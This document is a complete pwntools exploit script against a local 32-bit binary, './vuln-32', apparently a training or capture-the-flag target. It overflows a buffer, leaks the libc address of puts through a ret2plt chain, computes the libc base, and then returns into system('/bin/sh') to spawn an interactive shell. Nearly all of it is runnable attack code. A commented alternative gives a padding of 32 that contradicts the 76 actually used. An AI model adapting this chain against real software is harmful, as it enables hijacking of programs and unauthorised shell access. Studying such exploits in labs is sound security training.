from pwn import *

context.log_level = 'debug'
elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

padding = 76

# Step 1: Leak libc base address via ret2plt
payload = b'A' * padding
payload += p32(elf.plt['puts']) # override EIP to jumpt to puts@plt
payload += p32(elf.sym['main']) # return back to main (to repeat the bof)
payload += p32(elf.got['puts']) # set the argument of puts@plt to puts@got, which then prints the address of puts in the libc

# the above is equivalent to:
# payload = flat(
#     'A' * 32,
#     elf.plt['puts'],
#     elf.sym['main'],
#     elf.got['puts']
# )

p.clean()
p.sendline(payload)
puts_leak = u32(p.recv(4))
log.success(f"Puts GOT Offset: {hex(puts_leak)}")

libc_base = puts_leak - libc.sym['puts']
libc.address = libc_base
log.success(f'LIBC base: {hex(libc.address)}')

# Step 2: Exploit the program to jump into system('/bin/sh')
offset_to_system = libc_base + 0x00049720
offset_to_binsh = libc_base + 0x1b8fd1

payload = b'A' * padding
payload += p32(offset_to_system)
payload += p32(0x0)
payload += p32(offset_to_binsh)

p.clean()
p.sendline(payload)
p.interactive()